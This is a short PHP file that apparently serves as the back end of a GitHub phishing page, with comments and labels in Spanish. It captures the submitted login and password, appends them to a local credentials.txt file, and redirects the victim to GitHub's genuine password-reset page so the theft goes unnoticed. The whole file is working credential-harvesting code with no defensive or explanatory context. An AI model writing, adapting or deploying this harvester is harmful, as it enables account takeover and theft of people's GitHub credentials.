<?php

file_put_contents("credentials.txt", "[+] Github -> Usuario: " . $_POST['login'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://github.com/password_reset');
exit();
?>
